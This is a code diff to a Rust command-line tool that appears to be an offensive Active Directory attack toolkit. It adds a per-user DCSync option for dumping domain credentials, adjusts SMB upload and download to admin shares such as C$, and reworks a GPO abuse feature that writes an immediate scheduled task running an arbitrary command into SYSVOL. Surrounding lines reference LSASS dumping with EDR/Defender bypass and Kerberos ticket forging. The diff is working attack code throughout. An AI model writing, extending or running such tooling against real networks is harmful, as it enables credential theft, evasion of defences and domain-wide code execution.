@@ -376,6 +376,9 @@ enum Commands {
         target: String,
         #[arg(value_enum)]
         source: DumpSource,
+        /// Target specific user for DCSync (only with ntds source)
+        #[arg(long)]
+        user: Option<String>,
     },
 
     /// LSASS credential dumping — evasive in-process dump using raw syscalls (EDR/Defender bypass)
@@ -1774,11 +1777,11 @@ enum SmbAction {
         /// Target hostname or IP
         #[arg(short, long, required = true)]
         target: String,
-        /// Remote file path (UNC format or share-relative)
-        #[arg(short, long, required = true)]
+        /// Remote file path — starts with share name, e.g. C$/Windows/Temp/file.txt
+        #[arg(long, required = true)]
         path: String,
     },
-    /// Upload a file to an SMB share
+    /// Upload a file to an SMB share (remote format: Share$/path, e.g. C$/Windows/Temp/file.txt)
     Put {
         /// Target hostname or IP
         #[arg(short, long, required = true)]
@@ -1786,8 +1789,8 @@ enum SmbAction {
         /// Local file path
         #[arg(short, long, required = true)]
         local: String,
-        /// Remote file path
-        #[arg(short, long, required = true)]
+        /// Remote file path — starts with share name, e.g. C$/Windows/Temp/file.txt
+        #[arg(short = 'r', long, required = true)]
         remote: String,
     },
 }
@@ -1800,8 +1803,11 @@ enum SmbAction {
 enum DumpSource {
     Sam,
     Lsa,
+    /// DRSUAPI DCSync (replaces VSS-based NTDS dump)
     Ntds,
     Dcc2,
+    /// DRSUAPI DCSync (alias for ntds)
+    Dcsync,
 }
 
 #[derive(Debug, Clone, Copy, clap::ValueEnum)]
@@ -2335,7 +2341,7 @@ enum ForgeAction {
         #[arg(long)]
         krbtgt_aes256: Option<String>,
         /// Default username to impersonate
-        #[arg(short, long, default_value = "Administrator")]
+        #[arg(long, default_value = "Administrator")]
         user: String,
         /// Default RID to use
         #[arg(long, default_value = "500")]
@@ -2787,7 +2793,8 @@ async fn async_main() -> i32 {
         Commands::Dump {
             ref target,
             ref source,
-        } => commands_impl::cmd_dump(&cli, target, *source).await,
+            ref user,
+        } => commands_impl::cmd_dump(&cli, target, *source, user.as_deref()).await,
         Commands::DumpLsass {
             ref output,
             method,
@@ -5048,7 +5055,7 @@ async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
         }
         GpoAction::Write {
             gpo,
-            sysvol,
+            sysvol: _,
             command,
             task_name,
             user_policy,
@@ -5080,22 +5087,47 @@ async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
                 }
             };
 
-            // Resolve the SYSVOL share path (strip \\host\SYSVOL prefix)
+            // Resolve the SYSVOL share path to a relative path within the SYSVOL share.
+            // Users pass either \\dc\SYSVOL or \\dc\SYSVOL\domain\Policies\{GUID}
             let share = "SYSVOL";
             let policy_subdir = if user_policy { "User" } else { "Machine" };
-            let task_xml_path = format!(
-                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
-                sysvol.trim_end_matches('\\'),
-                gpo,
-                policy_subdir
-            );
-            // Extract just the path relative to SYSVOL share root
-            let rel_path = task_xml_path
-                .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
-                .trim_start_matches('\\')
-                .to_string();
+            // Always use the domain from the CLI to build the correct SYSVOL relative path.
+            // The SYSVOL structure is: \\dc\SYSVOL\{domain}\Policies\{GUID}\{Machine|User}\...
+            let domain = cli.domain.as_deref().unwrap_or("");
+            let rel_path = if domain.is_empty() {
+                format!(
+                    "Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                    gpo, policy_subdir
+                )
+            } else {
+                format!(
+                    "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                    domain, gpo, policy_subdir
+                )
+            };
 
             let xml = gpo_write::build_immediate_task_xml(&task_name, &command);
+
+            // Create any missing intermediate directories on the SYSVOL share.
+            // SMB2 CREATE with FILE_OPEN_IF + FILE_DIRECTORY_FILE handles this atomically.
+            // We build each parent directory component and create it in order.
+            let dir_prefix = rel_path
+                .trim_end_matches("ScheduledTasks.xml")
+                .trim_end_matches('\\');
+            let mut accum = String::new();
+            for component in dir_prefix.split('\\') {
+                if component.is_empty() {
+                    continue;
+                }
+                if !accum.is_empty() {
+                    accum.push('\\');
+                }
+                accum.push_str(component);
+                if let Err(e) = smb.create_dir(share, &accum).await {
+                    banner::print_fail(&format!("Failed to create directory '{}': {}", accum, e));
+                    return 1;
+                }
+            }
 
             match smb.write_file(share, &rel_path, xml.as_bytes()).await {
                 Ok(_) => {
@@ -5117,7 +5149,7 @@ async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
         }
         GpoAction::Cleanup {
             gpo,
-            sysvol,
+            sysvol: _,
             task_name,
             user_policy,
         } => {
@@ -5148,14 +5180,18 @@ async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
 
             let share = "SYSVOL";
             let policy_subdir = if user_policy { "User" } else { "Machine" };
-            let rel_path = format!(
-                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
-                sysvol
-                    .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
-                    .trim_start_matches('\\'),
-                gpo,
-                policy_subdir
-            );
+            let domain = cli.domain.as_deref().unwrap_or("");
+            let rel_path = if domain.is_empty() {
+                format!(
+                    "Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                    gpo, policy_subdir
+                )
+            } else {
+                format!(
+                    "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                    domain, gpo, policy_subdir
+                )
+            };
 
             match smb.delete_file(share, &rel_path).await {
                 Ok(_) => {
